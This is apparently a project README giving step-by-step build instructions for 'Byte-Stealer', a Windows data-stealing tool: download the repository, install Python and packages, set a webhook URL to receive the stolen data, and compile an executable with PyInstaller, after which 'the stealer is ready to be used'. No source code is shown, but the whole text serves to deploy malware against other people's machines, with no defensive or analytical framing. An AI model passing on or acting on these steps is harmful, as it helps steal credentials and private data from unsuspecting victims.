# How to use:

Requirements:\
• A windows machine
• VScode(Not required now but is helpful)

## Steps:
Current release isn't working btw!\
Download the .zip file from [main.zip](https://github.com/TurtlesXD/Byte-Stealer/archive/refs/heads/main.zip)(experimental) or from the latest release(more stable) and extract the data.Extract the data into a proper directory(like c://users//Yourusername//)and not Downloads or any other prebuilt windows directory or else the script wont work!\
Now if you dont have python run **Download-Python3.9.12.bat**. This will install python 3.9.12.\
If you already have python (3.9 or above) or have finished running **Download-Python3.9.12.bat**,\
Run **Install-Packages.bat**. This will download all the 3rd party packages used as well as pyinstaller for exe creation.\
Once you've finished running **Install-Packages.bat**,\
Now run **ConfigLogger.bat** and input your webhook url to change it.
Now you can run **buildExe.bat**, The file path should be ParentDirectory\Logger.py(Example: C:\Users\Admin\Logger.py)
```
 Note: Provide The actual paths(including the file name) to logger.py and an .ico file(optional) or else your exe will not be created!
```
Now open up the newly created *dist* folder and ***Boom***, your exe file has been created and the stealer is ready to be used!
